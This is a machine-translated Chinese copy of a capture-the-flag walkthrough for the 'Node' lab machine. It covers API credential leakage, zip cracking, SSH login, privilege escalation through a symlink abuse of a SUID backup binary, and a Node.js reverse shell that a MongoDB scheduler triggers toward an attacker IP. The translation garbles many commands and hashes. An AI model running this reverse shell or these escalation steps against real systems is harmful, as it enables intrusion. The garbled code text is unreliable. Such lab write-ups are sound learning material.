<html>
<head>
<title>Node HTB/Vulnhum VM</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">节点HTB/Vulnhum虚拟机</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/node-htb-vulnhum-vm-358be0bf616b?source=collection_archive---------1-----------------------#2018-08-12">https://infosecwriteups.com/node-htb-vulnhum-vm-358be0bf616b?source=collection_archive---------1-----------------------#2018-08-12</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><p id="03cf" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我最初完成这个虚拟机时，它托管在<a class="ae kl" href="https://www.hackthebox.eu" rel="noopener ugc nofollow" target="_blank"> HTB </a>。这真的很有趣，我从中学到了很多。当我在vulnhub上看到它时，我决定再试一次，看看我是否能记住如何找到它的根，以及我是否能找到任何新的方法。因此，这是我的演练，我希望你喜欢它，也许会学到一些东西。</p><p id="9f2b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">所以让我们直入主题，</p><p id="19b9" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">因此，在快速的nmap扫描后，我们可以看到它只打开了几个端口</p><p id="6760" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">T3】root @ Kali:~/Desktop/HTB/10 . 10 . 10 . 58 node # nmap 10 . 10 . 10 . 58T5】</strong></p><p id="4087" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir"> <em class="km">启动Nmap 7.60(</em></strong><a class="ae kl" href="https://nmap.org" rel="noopener ugc nofollow" target="_blank"><strong class="jp ir"><em class="km">https://nmap.org</em></strong></a><strong class="jp ir"><em class="km">)2017–10–15 09:06 BST<br/>10 . 10 . 10 . 58<br/>主机已启动(0.028秒延迟)。<br/>未显示:998过滤端口<br/>端口状态服务<br/> 22/tcp开放ssh <br/> 3000/tcp开放PPP</em>T25】</strong></p><p id="d48b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir"> <em class="km"> Nmap完成:19.86秒扫描1个IP地址(1台主机启动)</em> </strong></p><p id="5ec8" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我以前从未见过tcp 3000端口打开。让我们快速搜索一下，看看是什么。</p><figure class="ko kp kq kr gt ks gh gi paragraph-image"><div role="button" tabindex="0" class="kt ku di kv bf kw"><div class="gh gi kn"><img src="../Images/43ebfc7311d63c08c53798d26879721c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Q14g-7HBXsytJKY5kV2sUw.png"/></div></div></figure><p id="0650" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">嗯，所以不确定这是否有帮助，但我会把它保存到我的笔记中，然后继续。让我们看看能否在浏览器中看到它！</p><figure class="ko kp kq kr gt ks gh gi paragraph-image"><div role="button" tabindex="0" class="kt ku di kv bf kw"><div class="gh gi kz"><img src="../Images/d3b441cf2313c0b8f16cf6f63532e52a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*UHpyObGw9AHsiFYuNym1Mw.png"/></div></div></figure><p id="465f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">太棒了，看起来3000端口上有一个网站，快速查看一下源代码，没有什么真正跳出来的，让我们对它运行dirb扫描，看看我们是否能发现什么。虽然这是在后台工作，我们可以尝试登录并捕捉打嗝的请求。</p><figure class="ko kp kq kr gt ks gh gi paragraph-image"><div role="button" tabindex="0" class="kt ku di kv bf kw"><div class="gh gi la"><img src="../Images/31138bb540d31d4513e28fa64a2cb174.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*UrIL7loy_YtCNjzWOWDoOQ.png"/></div></div></figure><p id="6300" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">所以输入admin:admin显然不起作用，哈哈，但是绝对值得一试，当我在这里的时候，让我们试一个快速的sqli。但也不走运。所以似乎没有什么对我有用。让我们再看一看这一页的源代码，看看我们是否能找出前进的一步！！</p><figure class="ko kp kq kr gt ks gh gi paragraph-image"><div role="button" tabindex="0" class="kt ku di kv bf kw"><div class="gh gi lb"><img src="../Images/dbca8d88c87ca93dbf13ad467fc28e83.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Qv0p5wIZ2tNgGrCY7MdjYw.png"/></div></div></figure><p id="0242" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们可以看到它有一些。js脚本正在运行。让我们看看每个人都在做什么。</p><figure class="ko kp kq kr gt ks gh gi paragraph-image"><div role="button" tabindex="0" class="kt ku di kv bf kw"><div class="gh gi lc"><img src="../Images/47b6cd96d0b51694a35e8da89585daac.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*6MZyx8PgthLC1Q7Mncjxsw.png"/></div></div><figcaption class="ld le gj gh gi lf lg bd b be z dk translated">管理员. js</figcaption></figure><figure class="ko kp kq kr gt ks gh gi paragraph-image"><div class="gh gi lh"><img src="../Images/af3b76d7bd8cf8962a260c63579823cd.png" data-original-src="https://miro.medium.com/v2/resize:fit:1364/format:webp/1*EgVYbd7CK_Icc47D7Y7gDg.png"/></div><figcaption class="ld le gj gh gi lf lg bd b be z dk translated">app.js</figcaption></figure><figure class="ko kp kq kr gt ks gh gi paragraph-image"><div class="gh gi li"><img src="../Images/8657047b6f0c65d32482581fe7a57cce.png" data-original-src="https://miro.medium.com/v2/resize:fit:1260/format:webp/1*0LjtcmSnm6BWDcLCx6WVrg.png"/></div><figcaption class="ld le gj gh gi lf lg bd b be z dk translated">home.js</figcaption></figure><figure class="ko kp kq kr gt ks gh gi paragraph-image"><div role="button" tabindex="0" class="kt ku di kv bf kw"><div class="gh gi lj"><img src="../Images/ce0fe1cba18b3de045428320b5bb5a06.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*O8GEXwWbKMjFCqZaK5Ad1w.png"/></div></div><figcaption class="ld le gj gh gi lf lg bd b be z dk translated">login.js</figcaption></figure><figure class="ko kp kq kr gt ks gh gi paragraph-image"><div role="button" tabindex="0" class="kt ku di kv bf kw"><div class="gh gi lk"><img src="../Images/2a75b07405ef25ff675d68a269262602.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*0FX0ZAnNB1Miv4vgbk2whQ.png"/></div></div><figcaption class="ld le gj gh gi lf lg bd b be z dk translated">简介. js</figcaption></figure><p id="31bd" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">通过检查目录和文件等，我们得到了很多错误，但当我去<strong class="jp ir"><em class="km">/API/users</em>/latest</strong>时，我想我们偶然发现了一些可以用来继续前进的东西。</p><p id="2bf6" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir"><em class="km">[{ " _ id ":" 59a 7365 b 98 aa 325 cc 03 ee 51 c "，" username ":" myp 14 EAD m1 nacc count "，" password ":" dffc 504 aa 55359 b 9265 CBE B1 e 4032 Fe 600 b 64475 AE 3 FD 29 c 07d 23223334 d0af "，" is_admin":true}，</em> </strong></p><p id="3156" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir"><em class="km">{ " _ id ":" 59a 7368398 aa 325 cc 03 ee 51d "，"用户名":" tom "，"密码":" f0e 2e 750791171 b 0391 b 682 EC 35835 BD 6 a5 C3 f 7 c8 D1 d 0191451 EC 77 B4 d 75 f 240 "，" is_admin":false}，</em> </strong></p><p id="26e3" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir"><em class="km">{ " _ id ":" 59a 7368 e 98 aa 325 cc 03 ee 51 e "，"用户名":" mark "，"密码":" de 5a 1 ADF 4 fed CCE 1533915 EDC 60177547 f 1057 b 61 b 7119 FD 130 E1 f 7428705 f 73 "，" is_admin":false}，</em>T3】</strong></p><p id="0488" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir"><em class="km">{ " _ id ":" 59aa 9781 ced 6 f1 d 1490 FCE 9 "，"用户名":"光栅化"，"密码":" 5065 db 2 df 0d 4 ee 53562 c 650 c 29 bacf 55 b 97 e 231 e 3 Fe 88570 ABC 9 edd 8 b 78 AC 2 f 0 "，" is_admin":false}] </em> </strong></p><p id="f1e4" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们已经找到了该网站的一些帐户详细信息，看着它们，我们可以看到该网站有一个管理员。让我们尝试登录，如果我们可以使用信用</p><p id="e9da" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">通过散列标识符运行密码散列，它返回其阿沙-256散列</p><p id="94ce" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">它解密为</p><p id="b492" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">曼斯特</strong></p><p id="adbd" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">用这个登录我们会得到</p><figure class="ko kp kq kr gt ks gh gi paragraph-image"><div role="button" tabindex="0" class="kt ku di kv bf kw"><div class="gh gi ll"><img src="../Images/b94a5e107eeee3608800448d6a1c3fcd.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*O12A95_OtFZbOSCefz7gZg.png"/></div></div></figure><p id="0e5e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">所以我们可以下载备份，让我们用cat看看</p><p id="7e2d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><em class="km">(备份的输出已经剪得很大了省得你没完没了的滚动)</em><br/><strong class="jp ir"><em class="km">l 2 jvb 3 rzdhjhcc 9 jc3 mvvvqfaaph 6 klzdxglaaeaaaaaaaaaaaaaaaaaaauesbah 4 dfaajaagaqaeis 1h 8 f 0 actaaaaacnaaacnkbad 0 agaaaaaaaaaaaaaaaaaaaaaaaalsbbgbcjahzhci 93d vbxlwbgfjzs 9 zdg 0 awmvdmvuzg 9 yl 2 jvb 3 rzdhjhcc 9 JC 3</em></strong></p><p id="1e3b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">文件中只有大量的文本，但是结尾的那个小小的<strong class="jp ir"> = </strong>符号暗示它是base64编码的，所以让我们解码它，看看它说了什么。</p><p id="1376" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir"><em class="km">root @ Kali:~/Downloads # base64—decode my place . backup&gt;my decode . txt</em></strong></p><p id="f811" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir"><em class="km">PK @ KX | F \u Lp = \u# var/www/my place/static/vendor/bootstrap/CSS/bootstrap . min . cssut \u Yux<br/>PK @ K \u 6 \u RZ:9 \u！d # var/www/my place/static/vendor/bootstrap/CSS/bootstrap . cssut \u yux<br/>PK<br/>@ " k \u ax \u var/www/my place/static/vendor/bootstrap/fonts/ut \u\u yux<br/>PK @"kxǳ�ln�nn����#var/www/myplace/static/vendor/bootstrap/fonts/glyphicons-halflings-regular.eotut���yux<br/>PK @"k|��ɻh n \u＄var/www/my place/static/vendor/bootstrap/fonts/fontsn % var/www/my place/static/vendor/bootstrap/js/bootstrap . min . jsut</em></strong></p><p id="b3c5" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir"><em class="km">root @ Kali:~/Downloads # file my decoded . txt<br/>my decoded . txt:Zip存档数据，至少1.0版才能解压</em> </strong></p><p id="27f3" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">太棒了，所以这是一个zip文件，我们可以修改扩展名，使其成为zip文件，然后尝试提取它！！</p><figure class="ko kp kq kr gt ks gh gi paragraph-image"><div class="gh gi lm"><img src="../Images/0c3987367fb8bbfb548305991204c528.png" data-original-src="https://miro.medium.com/v2/resize:fit:1088/format:webp/1*VlaTk8spgP3AcEKZBAejZg.png"/></div></figure><p id="665e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">哈哈，没那么容易吧！！所以让我们用fcrackzip攻击它，看看我们是否能强行进入。</p><p id="3027" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir"><em class="km">root @ Kali:/usr/share/word lists/sec lists/rock you # fcrackzip myplacedecoded . zip-D-p rock you . txt<br/>找到可能的pw:magic word()</em></strong></p><p id="6b04" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">那很容易，一点也不需要花很长时间！！现在回到提取它。</p><figure class="ko kp kq kr gt ks gh gi paragraph-image"><div role="button" tabindex="0" class="kt ku di kv bf kw"><div class="gh gi ln"><img src="../Images/7b5203e04ee7b53aadba22207fa71fc3.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*2xwkYeHhlPPw1HiJo5XDkg.png"/></div></div></figure><p id="fb80" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">太棒了，所以让我们继续查看细节，并尝试找到前进的方向。在目录里面是我们之前看到的所有javascript文件。在回顾了其中的一些之后，我发现了app.js</p><figure class="ko kp kq kr gt ks gh gi paragraph-image"><div role="button" tabindex="0" class="kt ku di kv bf kw"><div class="gh gi lo"><img src="../Images/8e45f97fce76afdeca4d653e6cb42b8f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*-dr_m9gK2UbV2XtkVapCDg.png"/></div></div></figure><p id="7e7d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">app.js文件中是mark的登录详细信息</p><p id="7184" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">标记:5AYRft73VtFpc84k </strong></p><p id="b75e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">让ssh进来，看看它们是否工作。</p><p id="bf79" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir"><em class="km">root @ Kali:# ssh mark @ 10 . 10 . 10 . 58<br/>mark @ 10 . 10 . 10 . 58的密码:</em> </strong></p><p id="2ddb" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir"> <em class="km">上次登录:2017年9月27日02:33:14从10 . 10 . 14 . 3<br/>mark @ node:~ $ ls<br/>mark @ node:/home/frank $ locate user . txt<br/>/home/Tom/user . txt<br/>mark @ node:/home/frank $ cat/home/Tom/user . txt<br/>cat:/home/Tom/user . txt:权限被拒绝</em> </strong></p><p id="e0eb" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">好吧，所以我需要改变用户从马克到弗兰克获得任何进展。</p><p id="3430" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">让我们开始枚举盒子。最好的方法是把我们的LinEnum脚本放到机器上，从<strong class="jp ir"> /tmp </strong>目录运行它，因为我们通常在那里有写权限。</p><p id="c53d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">LinEnum扫描的输出显示，机器上有3个用户<strong class="jp ir">弗兰克、马克</strong>和<strong class="jp ir">汤姆</strong></p><p id="27cc" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">继续查看LinEnum输出，我们可以看到app.js进程正在运行一个用户Tom</p><p id="bcf5" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">T5】汤姆1236 0.1 5.0 1074104 38092？SSL 11:11 0:01/usr/bin/node/var/scheduler/app . js</strong></p><p id="8444" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们打开app.js，找到了之前找到的相同凭据。这表明它的备份是使用我们之前发现的相同脚本创建的。仔细查看文件，我们还发现这个脚本调用了<strong class="jp ir"> /usr/local/bin </strong>目录中的一个名为<strong class="jp ir"> backup </strong>的文件，并使用一个键来创建备份。</p><p id="3cfb" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在我们知道这个盒子上有MongoDB，我们可以用它来进一步利用它。<em class="km">(那一跳花了我很长时间，我被困了很长时间，在这个阶段我应该休息一下，我可能不会花这么长时间来理解Mongo的部分)。</em></p><p id="c942" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我可以创建并上传一个. js反向shell，并使用Mongo中的Sheduler来触发它。</p><p id="06b8" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">反向外壳看起来像这样:</p><blockquote class="lp lq lr"><p id="a06b" class="jn jo km jp b jq jr js jt ju jv jw jx ls jz ka kb lt kd ke kf lu kh ki kj kk ij bi translated"><strong class="jp ir">(function(){<br/>var net = require(" net ")，<br/> cp = require("child_process ")，<br/>sh = CP . spawn("/bin/sh " ,[])；<br/> var客户端=新网。socket()；<br/> client.connect(2007，“10.10.14.16”，function(){<br/>client . pipe(sh . stdin)；<br/> sh.stdout.pipe(客户端)；<br/> sh.stderr.pipe(客户端)；<br/>})；<br/>return/a/；//防止Node.js应用崩溃<br/>})()；</strong></p></blockquote><p id="9d04" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们使用wget和python SimpleHTTP把它放到盒子上。我们必须更改权限，让它在这台机器上运行。</p><p id="9cf9" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir"> chmod +x </strong></p><p id="0dcd" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">然后我们可以启动MongoDB，告诉它用调度程序运行什么。</p><p id="deb9" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir"> <em class="km"> mongo <br/>使用调度器<br/> db.auth("mark "，" 5a yrft 73 vtfpc 84k ")<br/>1</em></strong></p><p id="5292" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">切换到一个新的终端窗口，我们必须设置一个netcat监听器，当它被触发时捕捉我们的反向shell。</p><p id="d26e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir"> <em class="km"> nc在新端子-lnvp 2007 </em> </strong></p><p id="a44b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">切换回我们的另一个运行mongo的终端窗口，我们可以发出以下cmd:</p><p id="20aa" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir"><em class="km">db . tasks . insertone({ cmd:"/usr/bin/nodejs/tmp/shell . js " })；</em> </strong></p><p id="a32c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这将使你进入<strong class="jp ir"> Tom </strong> <em class="km">(第一步priv esc完成)</em>我们可以转到<strong class="jp ir"> /home/tom </strong> dir并捕获user.txt标志。</p><p id="e455" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们现在应该使用Toms用户权限重新开始枚举。</p><p id="0d29" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">启动我们可靠的老<strong class="jp ir"> LinEnum.sh </strong>并查看输出，我们可以看到:</p><p id="8940" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir"><em class="km">-rwsr-xr—1 root admin 16484 Sep 3 11:30/usr/local/bin/backup</em></strong></p><p id="8c02" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">导航到这个文件，在谷歌搜索了一下后，我发现它是backup/dirs，但我不能使用它或调用root或其他功能，否则它会反复骚扰我。</p><p id="59b6" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在进行了大量的枚举和谷歌搜索之后，我找到了一篇文章，建议从一个我们有写权限的目录(<strong class="jp ir"> /tmp </strong>)创建一个符号链接，我们也许可以绕过这个限制。</p><p id="b5b3" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">所以我在tmp文件夹中创建了一个指向/root的符号链接</p><p id="9300" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir"> mkdir -p /tmp/hack </strong></p><p id="2785" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">T5】Tom @ node:/tmp $ ln-s/root/tmp/hack/hackT7】</strong></p><p id="2072" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir"><em class="km">Tom @ node:/tmp $ file/tmp/hack/hack<br/>/tmp/hack/hack:到/root </em>的符号链接</strong></p><p id="c236" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们必须再次访问网页并下载新修改的备份文件。一旦我们有了它，我们就可以像以前一样使用密码<strong class="jp ir"> magicword </strong>进行解码</p><p id="ee78" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir"> <em class="km"> tom@node:/tmp$。/backup-q 45 fac 180 e 9 eee 72 f 4 FD 2d 9386 ea 7033 e 52 b 7 c 740 AFC 3d 98 a8d 0230167104d 474/tmp/hack</em></strong></p><p id="306b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir"><em class="km">&lt;45 fac 180 e 9 eee 72 f 4 FD 2d 9386 ea 7033 e 52 b 7 c 740 AFC 3d 98 a8d 0230167104d 474/tmp/hack<br/>bash:。/backup:没有这样的文件或目录<br/>Tom @ node:/tmp $/usr/local/bin/backup-q 45 fac 180 e 9 eee 72 f 4d 9386 ea 7033 e 52 b 7c 740 AFC 3d 98 a8d 0230167104d 474/tmp/hack<br/>&lt;72 f 4d 9386 ea 7033 e 52 b 7c 740 AFC 3d 98 a8d 0230160</em></strong></p><p id="6ad3" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在base 64解码之后，我们得到了一个root /dir的副本，其中包含了根标志，我们可以处理最后一个标志。</p><p id="628b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">1722 e 99 ca 5f 464 b 362556 a 62 BD 5e 6 be 0</strong></p><p id="2022" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">游戏结束了。哇，那真的很难，像往常一样，最近我从这台虚拟机中学到了很多。</p><p id="f556" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">非常感谢<a class="ae kl" href="https://twitter.com/@iamrastating" rel="noopener ugc nofollow" target="_blank">@ iam rasting</a>创建了这么棒的虚拟机，也感谢Vulnhub.com托管了这么多优秀的虚拟机。</p></div></div>    
</body>
</html>